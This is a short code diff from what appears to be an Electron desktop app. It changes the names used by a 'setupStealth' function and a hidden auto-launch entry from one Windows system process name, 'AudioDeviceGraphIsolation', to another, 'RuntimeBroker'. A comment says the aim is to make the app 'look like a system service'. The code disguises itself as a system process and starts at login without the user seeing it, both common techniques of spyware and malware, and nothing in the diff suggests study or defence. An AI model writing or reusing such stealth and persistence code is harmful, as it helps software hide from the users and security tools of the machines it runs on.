@@ -8,12 +8,12 @@ export function setupStealth(): void {
   }
 
   // Set app name to look like a system service
-  app.setName('AudioDeviceGraphIsolation');
+  app.setName('RuntimeBroker');
 }
 
 export async function setupAutoLaunch(): Promise<void> {
   const autoLauncher = new AutoLaunch({
-    name: 'AudioDeviceGraphIsolation',
+    name: 'RuntimeBroker',
     isHidden: true,
   });
 
